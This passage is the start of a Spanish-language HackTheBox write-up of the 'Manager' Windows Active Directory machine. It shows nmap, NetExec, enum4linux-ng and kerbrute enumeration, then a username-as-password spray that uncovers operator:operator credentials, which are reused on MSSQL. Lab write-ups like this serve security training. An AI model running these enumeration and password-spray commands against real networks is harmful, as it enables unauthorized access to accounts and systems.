<!doctype html><html lang=es><head><title>'Manager' Machine HTB WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="'Manager' HTB Machine WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="'Manager' Machine HTB WriteUp"><meta name=twitter:description content="'Manager' HTB Machine WriteUp"><meta property="og:title" content="'Manager' Machine HTB WriteUp"><meta property="og:description" content="'Manager' HTB Machine WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/manager/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-13T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-13T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/manager/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/manager/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/manager/>'Manager' Machine HTB WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-03-13T00:00:00Z>13 marzo, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
16 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/windows/>windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/medium/>medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/active-directory/>active directory</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/certify.exe/>certify.exe</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/certipy/>certipy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/evil-winrm/>evil-winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/winrm/>winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/mssql/>mssql</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/directory-leaking/>directory leaking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/impacket/>impacket</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/psexec.py/>psexec.py</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/pass-the-hash/>pass the hash</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/impacket-mssqlclient/>impacket-mssqlclient</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/adcs/>ADCS</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/crackmapexec/>crackmapexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netexec/>netexec</a></span></div></div></header><div class=post-content><hr><h1 id=m√°quina-manager----hackthebox>M√°quina &lsquo;Manager&rsquo; &ndash; HackTheBox
<a class=heading-link href=#m%c3%a1quina-manager----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Dificultad: <em>Medium</em> / <em>Media</em></li><li>Plataforma: <em>HackTheBox</em></li></ul><p><img src=/images/Manager_avatar.png alt="&lsquo;Manager&rsquo; Avatar"></p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>El scan de <code>Nmap</code> muestra m√∫ltiples puertos abiertos, entre ellos tenemos: <code>80</code> <code>HTTP</code>, <code>88</code> <code>Kerberos</code>, <code>135</code> <code>Microsoft RPC</code>, <code>389</code> <code>Lightweight Directory Access Protocol (LDAP)</code>, <code>445</code> <code>Server Message Block (SMB)</code>, <code>1433</code> <code>Microsoft SQL Server (MSSQL)</code>, <code>5985</code> <code>Windows Remote Management (WinRM)</code> y m√°s&mldr;</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49669,49670,49671,49731,63231,63253,63296 10.10.11.236 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 21:14 -03
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.236
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.27s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE    SERVICE       VERSION
</span></span></span><span class=line><span class=cl><span class=go>53/tcp    open     domain        Simple DNS Plus
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open     http          Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Manager
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>| http-methods:
</span></span></span><span class=line><span class=cl><span class=go>|_  Potentially risky methods: TRACE
</span></span></span><span class=line><span class=cl><span class=go>88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-12 07:14:27Z)
</span></span></span><span class=line><span class=cl><span class=go>135/tcp   open     msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-03-12T07:16:02+00:00; +7h00m00s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-07-30T13:51:28
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-07-29T13:51:28
</span></span></span><span class=line><span class=cl><span class=go>445/tcp   open     microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>464/tcp   open     kpasswd5?
</span></span></span><span class=line><span class=cl><span class=go>593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-03-12T07:16:03+00:00; +7h00m00s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-07-30T13:51:28
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-07-29T13:51:28
</span></span></span><span class=line><span class=cl><span class=go>1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
</span></span></span><span class=line><span class=cl><span class=go>| ms-sql-info:
</span></span></span><span class=line><span class=cl><span class=go>|   10.10.11.236:1433:
</span></span></span><span class=line><span class=cl><span class=go>|     Version:
</span></span></span><span class=line><span class=cl><span class=go>|       name: Microsoft SQL Server 2019 RTM
</span></span></span><span class=line><span class=cl><span class=go>|       number: 15.00.2000.00
</span></span></span><span class=line><span class=cl><span class=go>|       Product: Microsoft SQL Server 2019
</span></span></span><span class=line><span class=cl><span class=go>|       Service pack level: RTM
</span></span></span><span class=line><span class=cl><span class=go>|       Post-SP patches applied: false
</span></span></span><span class=line><span class=cl><span class=go>|_    TCP port: 1433
</span></span></span><span class=line><span class=cl><span class=go>| ms-sql-ntlm-info:
</span></span></span><span class=line><span class=cl><span class=go>|   10.10.11.236:1433:
</span></span></span><span class=line><span class=cl><span class=go>|     Target_Name: MANAGER
</span></span></span><span class=line><span class=cl><span class=go>|     NetBIOS_Domain_Name: MANAGER
</span></span></span><span class=line><span class=cl><span class=go>|     NetBIOS_Computer_Name: DC01
</span></span></span><span class=line><span class=cl><span class=go>|     DNS_Domain_Name: manager.htb
</span></span></span><span class=line><span class=cl><span class=go>|     DNS_Computer_Name: dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>|     DNS_Tree_Name: manager.htb
</span></span></span><span class=line><span class=cl><span class=go>|_    Product_Version: 10.0.17763
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2024-03-12T07:04:01
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2054-03-12T07:04:01
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-03-12T07:16:02+00:00; +7h00m00s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-03-12T07:16:02+00:00; +7h00m00s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-07-30T13:51:28
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-07-29T13:51:28
</span></span></span><span class=line><span class=cl><span class=go>3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-03-12T07:16:03+00:00; +7h00m00s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-07-30T13:51:28
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-07-29T13:51:28
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>9389/tcp  open     mc-nmf        .NET Message Framing
</span></span></span><span class=line><span class=cl><span class=go>49667/tcp open     msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>49670/tcp open     msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49671/tcp open     msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49731/tcp open     msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>63231/tcp filtered unknown
</span></span></span><span class=line><span class=cl><span class=go>63253/tcp open     msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>63296/tcp open     msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-03-12T07:15:22
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled and required
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 107.46 seconds
</span></span></span></code></pre></div><ul><li>Visitando el sitio web <code>HTTP</code> tenemos la siguiente p√°gina:
<img src=/images/Manager_1.png alt="Website view">
Exploro y pruebo cosas en ella, pero no hallo nada interesante</li><li>Luego, usar√© <code>NetExec</code> (el sucesor de <code>CrackMapExec</code>) para empezar a recolectar informaci√≥n del servicio <code>SMB</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.236
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
</span></span></span></code></pre></div><p>de manera que tenemos una m√°quina llamada <code>DC01</code> y un dominio <code>manager.htb</code></p><ul><li>Decido agregar la l√≠nea <code>10.10.11.236 manager.htb</code> a mi archivo <code>/etc/hosts</code> para futuros usos</li><li>Tambi√©n usar√© <code>enum4linux-ng</code> (el cual es <code>enum4linux</code>, pero escrito en <code>Python</code> en vez de <code>Pearl</code>; y el cual puede ser descargado desde <a href=https://github.com/cddmp/enum4linux-ng class=external-link target=_blank rel=noopener>su repositorio de Github</a>) para tratar de obtener informaci√≥n adicional:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 /home/gunzf0x/GitStuff/enum4linux-ng/enum4linux-ng.py 10.10.11.236
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ENUM4LINUX - next generation
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> ==========================
</span></span></span><span class=line><span class=cl><span class=go>|    Target Information    |
</span></span></span><span class=line><span class=cl><span class=go> ==========================
</span></span></span><span class=line><span class=cl><span class=go>[*] Target ........... 10.10.11.236
</span></span></span><span class=line><span class=cl><span class=go>[*] Username ......... &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Random Username .. &#39;dimuwiga&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Password ......... &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Timeout .......... 5 second(s)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go> ===========================================================
</span></span></span><span class=line><span class=cl><span class=go>|    Domain Information via SMB session for 10.10.11.236    |
</span></span></span><span class=line><span class=cl><span class=go> ===========================================================
</span></span></span><span class=line><span class=cl><span class=go>[*] Enumerating via unauthenticated SMB session on 445/tcp
</span></span></span><span class=line><span class=cl><span class=go>[+] Found domain information via SMB
</span></span></span><span class=line><span class=cl><span class=go>NetBIOS computer name: DC01
</span></span></span><span class=line><span class=cl><span class=go>NetBIOS domain name: MANAGER
</span></span></span><span class=line><span class=cl><span class=go>DNS domain: manager.htb
</span></span></span><span class=line><span class=cl><span class=go>FQDN: dc01.manager.htb
</span></span></span><span class=line><span class=cl><span class=go>Derived membership: domain member
</span></span></span><span class=line><span class=cl><span class=go>Derived domain: MANAGER
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> =========================================
</span></span></span><span class=line><span class=cl><span class=go>|    RPC Session Check on 10.10.11.236    |
</span></span></span><span class=line><span class=cl><span class=go> =========================================
</span></span></span><span class=line><span class=cl><span class=go>[*] Check for null session
</span></span></span><span class=line><span class=cl><span class=go>[+] Server allows session using username &#39;&#39;, password &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go>[*] Check for random user
</span></span></span><span class=line><span class=cl><span class=go>[+] Server allows session using username &#39;dimuwiga&#39;, password &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go>[H] Rerunning enumeration with user &#39;dimuwiga&#39; might give more results
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> &lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> =========================================
</span></span></span><span class=line><span class=cl><span class=go>|    Printers via RPC for 10.10.11.236    |
</span></span></span><span class=line><span class=cl><span class=go> =========================================
</span></span></span><span class=line><span class=cl><span class=go>[-] Could not get printer info via &#39;enumprinters&#39;: STATUS_ACCESS_DENIED
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Completed after 33.12 seconds
</span></span></span></code></pre></div><p>pero no puedo ver informaci√≥n nueva fuera de la ya encontrada por <code>NetExec</code> para los dominios del servicio.</p><ul><li>Debido a que tenemos un servicio <code>Kerberos</code> y el scan de <code>NetExec</code>, sospecho que estamos ante un ecosistema <code>Active Directory</code></li><li>Dado que no podemos enumerar usuarios usando <code>Microsoft RPC</code> (no es posible loguearse an√≥nimamente usando <code>rpcclient</code>), tratar√© de obtenerlos usando <code>Kerbrute</code> y un diccionario de usuarios t√≠picos sacado de <code>SecLists</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ kerbrute userenum -d manager.htb --dc 10.10.11.236 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 50
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    __             __               __
</span></span></span><span class=line><span class=cl><span class=go>   / /_____  _____/ /_  _______  __/ /____
</span></span></span><span class=line><span class=cl><span class=go>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
</span></span></span><span class=line><span class=cl><span class=go> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span></span><span class=line><span class=cl><span class=go>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Version: v1.0.3 (9dad6e1) - 03/11/24 - Ronnie Flathers @ropnop
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024/03/11 21:34:32 &gt;  Using KDC(s):
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:34:32 &gt;   10.10.11.236:88
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024/03/11 21:34:33 &gt;  [+] VALID USERNAME:       ryan@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:34:34 &gt;  [+] VALID USERNAME:       guest@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:34:35 &gt;  [+] VALID USERNAME:       cheng@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:34:35 &gt;  [+] VALID USERNAME:       raven@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:34:39 &gt;  [+] VALID USERNAME:       administrator@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:34:45 &gt;  [+] VALID USERNAME:       Ryan@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:34:46 &gt;  [+] VALID USERNAME:       Raven@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:34:49 &gt;  [+] VALID USERNAME:       operator@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:35:19 &gt;  [+] VALID USERNAME:       Guest@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:35:19 &gt;  [+] VALID USERNAME:       Administrator@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:35:42 &gt;  [+] VALID USERNAME:       Cheng@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:36:49 &gt;  [+] VALID USERNAME:       jinwoo@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:37:01 &gt;  [+] VALID USERNAME:       RYAN@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:37:40 &gt;  [+] VALID USERNAME:       RAVEN@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:37:42 &gt;  [+] VALID USERNAME:       GUEST@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:38:46 &gt;  [+] VALID USERNAME:       Operator@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/03/11 21:45:51 &gt;  [+] VALID USERNAME:       OPERATOR@manager.htb
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Como vemos encontramos usuarios, los cuales guardo en un archivo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat users.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ryan
</span></span></span><span class=line><span class=cl><span class=go>operator
</span></span></span><span class=line><span class=cl><span class=go>guest
</span></span></span><span class=line><span class=cl><span class=go>cheng
</span></span></span><span class=line><span class=cl><span class=go>raven
</span></span></span><span class=line><span class=cl><span class=go>administrator
</span></span></span><span class=line><span class=cl><span class=go>jinwoo
</span></span></span></code></pre></div><ul><li>Luego, intento un simple <code>Password Spray</code> usando las credenciales <code>username:username</code> con <code>NetExec</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.236 -u users.txt -p users.txt --continue-on-success
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:ryan STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:ryan STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:ryan STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:ryan STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:ryan STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:ryan STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:operator STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:operator STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>de manera que encontramos unas credenciales v√°lidas: <code>operator:operator</code></p><ul><li>Ahora que tengo un usuario, uso <code>rpcclient</code> para chequear usuarios en el dominio:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rpcclient -U &#39;operator%operator&#39; 10.10.11.236 -c &#39;enumdomusers&#39; | awk &#39;{print $1}&#39; | awk -F &#39;:&#39; &#39;{print $2}&#39; | tr -d &#34;[]&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Administrator
</span></span></span><span class=line><span class=cl><span class=go>Guest
</span></span></span><span class=line><span class=cl><span class=go>krbtgt
</span></span></span><span class=line><span class=cl><span class=go>Zhong
</span></span></span><span class=line><span class=cl><span class=go>Cheng
</span></span></span><span class=line><span class=cl><span class=go>Ryan
</span></span></span><span class=line><span class=cl><span class=go>Raven
</span></span></span><span class=line><span class=cl><span class=go>JinWoo
</span></span></span><span class=line><span class=cl><span class=go>ChinHae
</span></span></span><span class=line><span class=cl><span class=go>Operator
</span></span></span></code></pre></div><p>y, solo por si acaso, los guardo en un archivo para m√°s tarde</p><ul><li>Adem√°s, usando <code>NetExec</code> tambi√©n, chequeo si estas credenciales son v√°lidas para alg√∫n otro servicio que estaba corriendo en la m√°quina. Y lo son, esta credencial es reutilizada para el servicio <code>Microsoft SQL Server (MSSQL)</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec mssql 10.10.11.236 -u &#39;operator&#39; -p &#39;operator&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>MSSQL       10.10.11.236    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
</span></span></span><span class=line><span class=cl><span class=go>MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
